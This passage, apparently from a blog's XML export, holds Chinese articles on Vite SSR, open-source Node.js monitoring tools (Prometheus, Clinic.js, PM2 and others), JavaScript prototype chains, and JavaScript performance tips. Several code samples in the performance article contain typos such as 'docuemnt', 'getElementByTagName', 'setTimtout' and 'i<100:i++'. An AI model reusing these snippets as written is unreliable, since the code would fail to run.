<h3 id="服务端渲染-SSR-支持"><a href="#服务端渲染-SSR-支持" class="headerlink" title="服务端渲染 (SSR) 支持"></a><strong><strong>服务端渲染 (SSR) 支持</strong></strong></h3><p><code>Vite</code> 提供了 <code>api</code>，以便在开发过程中有效地在 <code>Node.js</code> 中加载和更新基于 <code>esm</code> 的源代码(就像服务器端 HMR 一样) ，并自动外部化 <code>commonjs</code> 兼容的依赖关系，以提高开发和 <code>SSR</code> 构建速度。生产服务器可以与 <code>Vite</code> 完全解耦</p>
<p><code>Vite SSR</code> 是作为一个低层次的特性提供的，我们期望看到更高层次的框架在引擎盖下利用它</p>
<h3 id="旧浏览器支持"><a href="#旧浏览器支持" class="headerlink" title="旧浏览器支持"></a><strong><strong>旧浏览器支持</strong></strong></h3><p><code>Vite</code> 的目标是默认支持原生 <code>ESM</code> 的现代浏览器，你也可以通过官方的<code>@vitejs/plugin-legacy</code> 选择支持传统的浏览器</p>
<p>这个插件会自动生成现代/旧版两个包，并且基于浏览器/特征提取，提供正确的包，确保在支持它们的现代浏览器中有更高效的代码</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>【译】生产环境下的Node.js——开源监控工具</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E3%80%90%E8%AF%91%E3%80%91%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84Node%E2%80%94%E2%80%94%E5%BC%80%E6%BA%90%E7%9B%91%E6%8E%A7%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>你认为Node.js应用程序可以拥有的最重要的功能是什么？ 是花哨的全文模糊匹配搜索，还是用socket进行实时聊天呢？ 你能告诉我可以添加到Node.js应用中的最高级，最惊人和最吸引人的功能是什么么？</p>
<p>想知道我的么？<strong>高性能和不间断服务</strong>。高性能应用程序需要做好以下三点：</p>
<ol>
<li> 最短的停机时间；</li>
<li> 可预测的资源使用率；</li>
<li> 根据负载有效扩展</li>
</ol>
<p>在第1部分，<a href="https://sematext.com/blog/top-nodejs-metrics-to-watch/">Node.js要监控的关键指标</a>中，我们讨论了您应该监控的关键Node.js指标，以便了解应用程序的运行状况。 我还解释了你应该避免的Node.js中的错误做法，例如阻塞线程和造成内存泄漏，还有一些巧妙的技巧可以用来提高应用程序的性能，比如使用集群模块创建工作进程和将长时间运行的任务从主线程分离开来用独立线程运行。</p>
<p>在本文中，我将描述如何使用5种不同的开源工具监控Node.js应用程序。它们可能没有像<code>Sematext</code>或<code>Datadog</code>那样功能全面，但它们是开源产品，可以完全由自己控制。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-2cb6935ebf2df783.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="Appmetrics"><a href="#Appmetrics" class="headerlink" title="Appmetrics"></a>Appmetrics</h2><p>Node应用指标监控看板显示了运行中的Node.js应用程序的性能数据。这是一个简单的模块，在Node.js入口文件的顶部应用并初始化。你可以通过在终端中运行以下命令从npm安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install appmetrics-dash</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>Appmetrics提供了一个非常易于使用的Web仪表板。为了获得所有由应用程序创建的HTTP服务的仪表板，你需要做的是在app.js(或者以其他命名的入口文件)文件中添加以下代码段。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; Before all other &#39;require&#39; statements</span><br><span class="line">require(&#39;appmetrics-dash&#39;).attach()</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>之后你将通过这个请求路径<code>/appmetrics-dash</code>中看到大量有用的指标。</p>
<ul>
<li>  CPU Profiling</li>
<li>  HTTP传入请求</li>
<li>  HTTP吞吐量</li>
<li>  平均响应时间（前5名）</li>
<li>  CPU</li>
<li>  内存</li>
<li>  堆（Heap)</li>
<li>  事件循环时间（Event Loop Times）</li>
<li>  环境</li>
<li>  其他请求</li>
<li>  HTTP出站请求</li>
</ul>
<p>此工具不仅显示指标。它允许您直接从仪表板生成Node.js报告和堆快照(Heap Snapshots)。 除此之外，您还可以使用Flame Graphs,非常酷的开源工具。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-78124460b252f2d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="Express-Status-Monitor"><a href="#Express-Status-Monitor" class="headerlink" title="Express Status Monitor"></a>Express Status Monitor</h2><p>Express.js是当前Node.js开发人员的的首选框架。 <a href="https://github.com/RafalWilinski/express-status-monitor">Express Status Monitor</a>是一个非常简单的独立模块，您可以将其添加到Express应用。它公开了一个<code>/status</code>路由，在Socket.io和Chart.js的帮助下报告实时服务器指标。</p>
<p>从npm安装即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install express-status-monitor</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>安装完这个模块之后，你需要在其他中间件或者路由之前添加它。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.use(require(&#39;express-status-monitor&#39;)())</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>之后一旦你运行你的应用，你就可以通过<code>/status</code>路由检查你的Node.js指标。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-7351c6135a0f03ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="Prometheus"><a href="#Prometheus" class="headerlink" title="Prometheus"></a>Prometheus</h2><p>除非你生活在原始时代，不然你一定听说过<a href="https://prometheus.io/">Prometheus</a>。这是目前我们能使用的最著名的开源监控工具。Prometheus 100%开源并由社区驱动。所有的组件在遵从Apache 2 License开源协议并可以从GitHub下载。它是由<a href="https://cncf.io/">CNCF</a>（Cloud Native Computing Foundation）管理并已经毕业<a href="https://www.cncf.io/projects/">成员项目</a>之一，跟它同样的成员项目包括<code>Kubernetes</code>和<code>Fluentd</code>等。</p>
<p>要开始使用Prometheus进行监控，您需要下载最新版本并进行安装。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ tar xvfz prometheus-\*.tar.gz</span><br><span class="line">$ cd prometheus-\*</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>然后通过运行可执行文件启动它，但在运行此命令之前，需要创建一个<code>prometheus.yml</code>文件。 它是一个配置文件，用于配置在哪些targets上，通过抓取HTTP端点数据监控哪些指标。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># prometheus.yml</span><br><span class="line">scrape_configs:</span><br><span class="line">  - job_name: &#39;prometheus&#39;</span><br><span class="line">    scrape_interval: 1s</span><br><span class="line">    static_configs:</span><br><span class="line">      - targets: [&#39;127.0.0.1:3000&#39;]</span><br><span class="line">        labels:</span><br><span class="line">          service: &#39;test-prom&#39;</span><br><span class="line">          group: &#39;production&#39;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>现在你可以使用Prometheus了。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ .&#x2F;prometheus --config.file&#x3D;prometheus.yml</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>但是，我很懒，而且我非常喜欢Docker。 所以我的做法是运行官方的<a href="https://hub.docker.com/r/prom/prometheus/">Prometheus Docker镜像</a>，避免下载它的所有麻烦。</p>
<h2 id="Prometheus-and-Docker"><a href="#Prometheus-and-Docker" class="headerlink" title="Prometheus and Docker"></a>Prometheus and Docker</h2><p>首先，进到Node.js应用程序的根目录。在这里，创建一个<code>prometheus-data</code>目录并将<code>prometheus.yml</code>文件放入其中。完成此操作后，运行Prometheus Docker容器。</p>
<p>获取正式的Prometheus Docker镜像并使用docker run命令运行该镜像。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker run -d \</span><br><span class="line">    --name prometheus \</span><br><span class="line">    --network&#x3D;&quot;host&quot; \</span><br><span class="line">    -v &quot;$(pwd)&#x2F;prometheus-data&quot;:&#x2F;prometheus-data \</span><br><span class="line">    prom&#x2F;prometheus \</span><br><span class="line">    --config.file&#x3D;&#x2F;prometheus-data&#x2F;prometheus.yml</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>我选择使用-network =“host”运行容器，让Prometheus容器可以通过本机localhost地址访问，并且这样做，Node.js应用程序的也能通过本机HTTP端口访问到。否则，如果你将Prometheus和Node.js分别运行在容器内，则需要在两者之间建立一个<a href="https://docs.docker.com/network/bridge/">网络</a>，以便彼此之间只能相互访问到。</p>
<p><code>-v</code>选项用于将<code>prometheus-data</code>目录从主机映射到容器内的同名目录。</p>
<p>在Prometheus容器运行后，需要在Node.js应用程序中添加配置的代码以暴露一个监控数据接口。 首先需要从npm安装适用于Node.js的<a href="https://www.npmjs.com/package/prom-client">Prometheus客户端</a>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install prom-client</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>接在添加相关Prometheus相关配置代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; after all &#39;require&#39; statements</span><br><span class="line">const client &#x3D; require(&#39;prom-client&#39;)</span><br><span class="line">const collectDefaultMetrics &#x3D; client.collectDefaultMetrics</span><br><span class="line">collectDefaultMetrics(&#123; timeout: 1000 &#125;)</span><br><span class="line">app.get(&#39;&#x2F;metrics&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">  res.set(&#39;Content-Type&#39;, client.register.contentType)</span><br><span class="line">  res.end(client.register.metrics())</span><br><span class="line">&#125;)</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>接下来你只需运行Node.js应用之后，通过<code>http://localhost:9090/graph</code>就可以看到Prometheus图表</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-9476399a27b7749c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="Clinic-js"><a href="#Clinic-js" class="headerlink" title="Clinic.js"></a>Clinic.js</h2><p>Clinic.js包含三个工具，可帮助诊断和查明Node.js性能问题。它的使用非常简单。你需要做的就是从npm安装模块并运行它。它将为您生成报告，使故障排除变得更加容易。</p>
<p>使用如下命令安装Clinic.js</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install clinic</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>一旦安装完毕，就可以选择要生成的报告类型了。你可以选择以下三种报告类型。</p>
<ul>
<li>Doctor<ol>
<li> 通过注入探针来收集指标</li>
<li> 评估健康和启发式</li>
<li> 提供修复推荐</li>
</ol>
</li>
<li>Bubbleprof- 一种全新的，完全独特的方法来分析Node.js代码<ol>
<li> 使用async_hooks收集指标</li>
<li> 跟踪操作之间的延迟</li>
<li> 创建气泡图</li>
</ol>
</li>
<li>Flame - 使用火焰图揭示代码中的瓶颈和热路径<ol>
<li> 通过CPU采样收集指标</li>
<li> 跟踪栈顶频率</li>
<li> 创建火焰图</li>
</ol>
</li>
</ul>
<p>让我们从运行Doctor并测试node.js应用程序开始。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ clinic doctor -- node app.js</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>在程序运行时，使用压测工具运行负载测试。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-bd3a71c2bc4a339e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ loadtest -n 1000 -c 100 [http:&#x2F;&#x2F;localhost:3000&#x2F;api](http:&#x2F;&#x2F;localhost:3000&#x2F;api)</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>一旦完成运行，停止服务器和Clinic.js Doctor将打开您可以查看的报告。</p>
<p>使用相同的方法，您可以运行Bubbleprof或Flame并获取相应工具的图形报告。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-765b447fe955aec8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/10024246-530a6b47fb727c99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="PM2"><a href="#PM2" class="headerlink" title="PM2"></a>PM2</h2><p>使用PM2在生产中运行Node.js应用程序变得更加容易。 它是一个进程管理器，可以轻松地让您以集群模式运行应用程序。通俗来说，它将为您的主机每个CPU核心都生成一个进程。</p>
<p>首先安装<a href="https://www.npmjs.com/package/pm2">PM2</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install pm2 -g</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>安装完成后，如果您的主源文件是app.js，则通过在终端中运行此命令来生成PM2守护程序。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pm2 start app.js -i 0</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p><code>-i 0</code>标志实例个数。这将以集群模式运行Node.js应用程序，其中数字0表示CPU核心数。你可以手动输入你想要的任何数字，但让PM2计算核心个数并自动产生相应个数的工作进程更简单些。</p>
<p>使用PM2查看<a href="https://github.com/Unitech/pm2">Node.js监控数据</a>也很容易</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pm2 monit</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure>

<p>此命令将在终端中打开仪表板。在这里，您可以监视进程，日志，循环延迟，进程内存和CPU。</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-a0830b788f0a2447.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="使用开源工具将监控Node-js方案进行包装"><a href="#使用开源工具将监控Node-js方案进行包装" class="headerlink" title="使用开源工具将监控Node.js方案进行包装"></a>使用开源工具将监控Node.js方案进行包装</h2><p>性能指标对于让用户满意至关重要。在本文中，我向您展示了如何使用5种不同的开源工具向Node.js应用程序添加监视。 在了解了本系列第1部分<a href="https://sematext.com/blog/top-nodejs-metrics-to-watch/">Node.js要监控的关键指标</a>之后，添加工具来监控现实生活中的应用程序是自然的学习进程。 本系列的最后一部分将介绍<a href="https://sematext.com/blog/nodejs-monitoring-made-easy-with-sematext/">使用Sematext进行生产环境下Node.js监控</a>。</p>
<p>如果你想查看示例代码，这里是一个包含所有的<a href="https://github.com/adnanrahic/nodejs-monitoring-sematext/tree/develop">实例代码 repo</a>。你还可以克隆下来并选择任何工具打开。</p>
<p>如果你需要更多软件的全栈可观察性，请查看<a href="https://sematext.com/">Sematext</a>。 我们正在推动<a href="https://github.com/sematext">开源我们的产品</a>并产生影响。</p>
<p>原文：<a href="https://dev.to/sematext/node-js-open-source-monitoring-tools-440a">Node.js Open-Source Monitoring Tools</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li>  <a href="https://www.ctolib.com/docs/sfile/prometheus-book/index.html">Prometheus操作指南</a></li>
<li>  <a href="https://www.ibm.com/developerworks/cn/cloud/library/cl-lo-prometheus-getting-started-and-practice/">Prometheus 入门与实践</a></li>
</ul>
<p>作者：Make_a_decision<br>链接：<a href="https://juejin.cn/post/6844903859479904264">https://juejin.cn/post/6844903859479904264</a><br>来源：掘金<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>原型</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E5%8E%9F%E5%9E%8B/</url>
    <content><![CDATA[<p>JavaScript 不包含传统的类继承模型，而是使用 <em>prototype</em> 原型模型。</p>
<p>虽然这经常被当作是 JavaScript 的缺点被提及，其实基于原型的继承模型比传统的类继承还要强大。 实现传统的类继承模型是很简单，但是实现 JavaScript 中的原型继承则要困难的多。 (It is for example fairly trivial to build a classic model on top of it, while the other way around is a far more difficult task.)</p>
<p>由于 JavaScript 是唯一一个被广泛使用的基于原型继承的语言，所以理解两种继承模式的差异是需要一定时间的。</p>
<p>第一个不同之处在于 JavaScript 使用<em>原型链</em>的继承方式。</p>
<p><strong>注意:</strong> 简单的使用 <code>Bar.prototype = Foo.prototype</code> 将会导致两个对象共享<strong>相同</strong>的原型。 因此，改变任意一个对象的原型都会影响到另一个对象的原型，在大多数情况下这不是希望的结果。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Foo() &#123;</span><br><span class="line">    this.value &#x3D; 42;</span><br><span class="line">&#125;</span><br><span class="line">Foo.prototype &#x3D; &#123;</span><br><span class="line">    method: function() &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function Bar() &#123;&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 设置Bar的prototype属性为Foo的实例对象</span><br><span class="line">Bar.prototype &#x3D; new Foo();</span><br><span class="line">Bar.prototype.foo &#x3D; &#39;Hello World&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 修正Bar.prototype.constructor为Bar本身</span><br><span class="line">Bar.prototype.constructor &#x3D; Bar;</span><br><span class="line"></span><br><span class="line">var test &#x3D; new Bar() &#x2F;&#x2F; 创建Bar的一个新实例</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 原型链</span><br><span class="line">test [Bar的实例]</span><br><span class="line">    Bar.prototype [Foo的实例] </span><br><span class="line">        &#123; foo: &#39;Hello World&#39; &#125;</span><br><span class="line">        Foo.prototype</span><br><span class="line">            &#123;method: ...&#125;;</span><br><span class="line">            Object.prototype</span><br><span class="line">                &#123;toString: ... &#x2F;* etc. *&#x2F;&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上面的例子中，<code>test</code> 对象从 <code>Bar.prototype</code> 和 <code>Foo.prototype</code> 继承下来；因此， 它能访问 <code>Foo</code> 的原型方法 <code>method</code>。同时，它也能够访问<strong>那个</strong>定义在原型上的 <code>Foo</code> 实例属性 <code>value</code>。 需要注意的是 <code>new Bar()</code> <strong>不会</strong>创造出一个新的 <code>Foo</code> 实例，而是 重复使用它原型上的那个实例；因此，所有的 <code>Bar</code> 实例都会共享<strong>相同</strong>的 <code>value</code> 属性。</p>
<p><strong>注意:</strong> <strong>不要</strong>使用 <code>Bar.prototype = Foo</code>，因为这不会执行 <code>Foo</code> 的原型，而是指向函数 <code>Foo</code>。 因此原型链将会回溯到 <code>Function.prototype</code> 而不是 <code>Foo.prototype</code>，因此 <code>method</code> 将不会在 Bar 的原型链上。</p>
<h3 id="属性查找"><a href="#属性查找" class="headerlink" title="属性查找"></a>属性查找</h3><p>当查找一个对象的属性时，JavaScript 会<strong>向上</strong>遍历原型链，直到找到给定名称的属性为止。</p>
<p>到查找到达原型链的顶部 - 也就是 <code>Object.prototype</code> - 但是仍然没有找到指定的属性，就会返回 <a href="http://bonsaiden.github.io/JavaScript-Garden/zh/#core.undefined">undefined</a>。</p>
<h3 id="原型属性"><a href="#原型属性" class="headerlink" title="原型属性"></a>原型属性</h3><p>当原型属性用来创建原型链时，可以把<strong>任何</strong>类型的值赋给它（prototype）。 然而将原子类型赋给 prototype 的操作将会被忽略。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Foo() &#123;&#125;</span><br><span class="line">Foo.prototype &#x3D; 1; &#x2F;&#x2F; 无效</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>而将对象赋值给 prototype，正如上面的例子所示，将会动态的创建原型链。</p>
<h3 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h3><p>如果一个属性在原型链的上端，则对于查找时间将带来不利影响。特别的，试图获取一个不存在的属性将会遍历整个原型链。</p>
<p>并且，当使用 <code>for in</code>循环遍历对象的属性时，原型链上的<strong>所有</strong>属性都将被访问。</p>
<h3 id="扩展内置类型的原型"><a href="#扩展内置类型的原型" class="headerlink" title="扩展内置类型的原型"></a>扩展内置类型的原型</h3><p>一个错误特性被经常使用，那就是扩展 <code>Object.prototype</code> 或者其他内置类型的原型对象。</p>
<p>这种技术被称之为 monkey patching 并且会破坏<em>封装</em>。虽然它被广泛的应用到一些 JavaScript 类库中比如 Prototype, 但是我仍然不认为为内置类型添加一些<em>非标准</em>的函数是个好主意。</p>
<p>扩展内置类型的<strong>唯一</strong>理由是为了和新的 JavaScript 保持一致，比如 <code>Array.forEach</code>。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在写复杂的 JavaScript 应用之前，充分理解原型链继承的工作方式是每个 JavaScript 程序员<strong>必修</strong>的功课。 要提防原型链过长带来的性能问题，并知道如何通过缩短原型链来提高性能。 更进一步，绝对<strong>不要</strong>扩展内置类型的原型，除非是为了和新的 JavaScript 引擎兼容。</p>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>Javascript执行效率小结</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/Javascript%E6%89%A7%E8%A1%8C%E6%95%88%E7%8E%87%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p><strong>Javascript</strong>是一门非常灵活的语言，我们可以随心所欲的书写各种风格的代码，不同风格的代码也必然也会导致执行效率的差异，开发过程中零零散散地接触到许多提高代码性能的方法，整理一下平时比较常见并且容易规避的问题。</p>
<hr>
<h2 id="Javascript自身执行效率"><a href="#Javascript自身执行效率" class="headerlink" title="Javascript自身执行效率**"></a>Javascript自身执行效率**</h2><p>Javascript中的作用域链、闭包、原型继承、eval等特性，在提供各种神奇功能的同时也带来了各种效率问题，用之不慎就会导致执行效率低下。</p>
<h4 id="1、全局导入"><a href="#1、全局导入" class="headerlink" title="1、全局导入"></a><strong>1、全局导入</strong></h4><p>我们在编码过程中多多少少会使用到一些全局变量（window,document,自定义全局变量等等），了解<a href="https://coding.imooc.com/?c=java">java</a>script作用域链的人都知道，在局部作用域中访问全局变量需要一层一层遍历整个作用域链直至顶级作用域，而局部变量的访问效率则会更快更高，因此在局部作用域中高频率使用一些全局对象时可以将其导入到局部作用域中，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;1、作为参数传入模块</span><br><span class="line"> (function(window,$)&#123;</span><br><span class="line">      var xxx &#x3D; window.xxx;</span><br><span class="line">      $(&quot;#xxx1&quot;).xxx();</span><br><span class="line">      $(&quot;#xxx2&quot;).xxx();</span><br><span class="line">  &#125;)(window,jQuery);</span><br><span class="line">  </span><br><span class="line">  &#x2F;&#x2F;2、暂存到局部变量</span><br><span class="line">  function()&#123;</span><br><span class="line">     var doc &#x3D; document;</span><br><span class="line">     var global &#x3D; window.global;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h4 id="2、eval以及类eval问题"><a href="#2、eval以及类eval问题" class="headerlink" title="2、eval以及类eval问题"></a><strong>2、eval以及类eval问题</strong></h4><p>我们都知道eval可以将一段字符串当做js代码来执行处理，据说使用eval执行的代码比不使用eval的代码慢100倍以上（具体效率我没有测试，有兴趣同学可以测试一下）</p>
<p>JavaScript 代码在执行前会进行类似“预编译”的操作：首先会创建一个当前执行环境下的活动对象，并将那些用 var 申明的变量设置为活动对象的属性，但是此时这些变量的赋值都是 undefined，并将那些以 function 定义的函数也添加为活动对象的属性，而且它们的值正是函数的定义。但是，如果你使用了“eval”，则“eval”中的代码（实际上为字符串）无法预先识别其上下文，无法被提前解析和优化，即无法进行预编译的操作。所以，其性能也会大幅度降低</p>
<p>其实现在大家一般都很少会用eval了，这里我想说的是两个类eval的场景(new Function{},setTimeout,setInterver)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setTimtout(&quot;alert(1)&quot;,1000);</span><br><span class="line"></span><br><span class="line">setInterver(&quot;alert(1)&quot;,1000);</span><br><span class="line"></span><br><span class="line">(new Function(&quot;alert(1)&quot;))();</span><br></pre></td></tr></table></figure>

<p>上述几种类型代码执行效率都会比较低，因此建议直接传入匿名方法、或者方法的引用给setTimeout方法</p>
<p><strong>3、闭包结束后释放掉不再被引用的变量</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var f &#x3D; (function()&#123;</span><br><span class="line">    var a &#x3D; &#123;name:&quot;var3&quot;&#125;;</span><br><span class="line">    var b &#x3D; [&quot;var1&quot;,&quot;var2&quot;];</span><br><span class="line">    var c &#x3D; document.getElementByTagName(&quot;li&quot;);</span><br><span class="line">    &#x2F;&#x2F;****其它变量</span><br><span class="line">    &#x2F;&#x2F;***一些运算</span><br><span class="line">    var res &#x3D; function()&#123;</span><br><span class="line">        alert(a.name);</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<p>上述代码中变量f的返回值是由一个立即执行函数构成的闭包中返回的方法res，该变量保留了对于这个闭包中所有变量（a,b,c等）的引用，因此这两个变量会一直驻留在内存空间中,尤其是对于dom元素的引用对内存的消耗会很大，而我们在res中只使用到了a变量的值，因此，在闭包返回前我们可以将其它变量释放</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var f &#x3D; (function()&#123;</span><br><span class="line">    var a &#x3D; &#123;name:&quot;var3&quot;&#125;;</span><br><span class="line">    var b &#x3D; [&quot;var1&quot;,&quot;var2&quot;];</span><br><span class="line">    var c &#x3D; document.getElementByTagName(&quot;li&quot;);</span><br><span class="line">    &#x2F;&#x2F;****其它变量</span><br><span class="line">    &#x2F;&#x2F;***一些运算</span><br><span class="line">    &#x2F;&#x2F;闭包返回前释放掉不再使用的变量</span><br><span class="line">    b &#x3D; c &#x3D; null;</span><br><span class="line">    var res &#x3D; function()&#123;</span><br><span class="line">        alert(a.name);</span><br><span class="line">        &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="Js操作dom的效率"><a href="#Js操作dom的效率" class="headerlink" title="Js操作dom的效率"></a><strong>Js操作dom的效率</strong></h2><p>在web开发过程中，前端执行效率的瓶颈往往都是在dom操作上面，dom操作是一件很耗性能的事情，如何才能在dom操作过程中尽量节约性能呢？</p>
<h4 id="1、减少reflow"><a href="#1、减少reflow" class="headerlink" title="1、减少reflow"></a><strong>1、减少reflow</strong></h4><h6 id="什么是reflow？"><a href="#什么是reflow？" class="headerlink" title="什么是reflow？"></a><strong>什么是reflow？</strong></h6><p>当 DOM 元素的属性发生变化 (如 color) 时, 浏览器会通知 render 重新描绘相应的元素, 此过程称为 repaint。</p>
<p>如果该次变化涉及元素布局 (如 width), 浏览器则抛弃原有属性, 重新计算并把结果传递给 render 以重新描绘页面元素, 此过程称为 reflow。</p>
<h6 id="减少reflow的方法"><a href="#减少reflow的方法" class="headerlink" title="减少reflow的方法"></a><strong>减少reflow的方法</strong></h6><ol>
<li> 先将元素从document中删除，完成修改后再把元素放回原来的位置（当对某元素及其子元素进行大量reflow操作时，1,2两种方法效果才会比较明显）</li>
<li> 将元素的display设置为”none”，完成修改后再把display修改为原来的值</li>
<li> 修改多个样式属性时定义class类代替多次修改style属性（for certain同学推荐）</li>
<li> 大量添加元素到页面时使用documentFragment</li>
</ol>
<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var i&#x3D;0;i&lt;100:i++)&#123;</span><br><span class="line">    var child &#x3D; docuemnt.createElement(&quot;li&quot;);</span><br><span class="line">    child.innerHtml &#x3D; &quot;child&quot;;</span><br><span class="line">    document.getElementById(&quot;parent&quot;).appendChild(child);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码会多次操作dom，效率比较低，可以改为下面的形式 创建documentFragment，将所有元素加入到docuemntFragment不会改变dom结构，最后将其添加到页面，只进行了一次reflow</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var frag &#x3D; document.createDocumentFragment();</span><br><span class="line">for(var i&#x3D;0;i&lt;100:i++)&#123;</span><br><span class="line">        var child &#x3D; docuemnt.createElement(&quot;li&quot;);</span><br><span class="line">        child.innerHtml &#x3D; &quot;child&quot;;</span><br><span class="line">    frag.appendChild(child);</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(&quot;parent&quot;).appendChild(frag);</span><br></pre></td></tr></table></figure>

<h4 id="2、暂存dom状态信息"><a href="#2、暂存dom状态信息" class="headerlink" title="2、暂存dom状态信息"></a><strong>2、暂存dom状态信息</strong></h4><p>当代码中需要多次访问元素的状态信息，在状态不变的情况下我们可以将其暂存到变量中，这样可以避免多次访问dom带来内存的开销，典型的例子就是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ar lis &#x3D; document.getElementByTagName(&quot;li&quot;);</span><br><span class="line">for(var i&#x3D;1;i&lt;lis.length;i++)&#123;</span><br><span class="line">    &#x2F;&#x2F;***</span><br><span class="line">&#125;</span><br><span class="line">上述方式会在每一次循环都去访问dom元素，我们可以简单将代码优化如下</span><br><span class="line">var lis &#x3D; document.getElementByTagName(&quot;li&quot;);</span><br><span class="line">for(var i&#x3D;1,j&#x3D;lis.length ;i&lt;j;i++)&#123;</span><br><span class="line">    &#x2F;&#x2F;***</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3、缩小选择器的查找范围"><a href="#3、缩小选择器的查找范围" class="headerlink" title="3、缩小选择器的查找范围"></a><strong>3、缩小选择器的查找范围</strong></h4><p>查找dom元素时尽量避免大面积遍历页面元素，尽量使用精准选择器，或者指定上下文以缩小查找范围，以jquery为例</p>
<ul>
<li>  少用模糊匹配的选择器：例如$(“[name*=’_fix’]”)，多用诸如id以及逐步缩小范围的复合选择器$(“li.active”)等</li>
<li>  指定上下文：例如$(“#parent .class”)，$(“.class”,$el)等</li>
</ul>
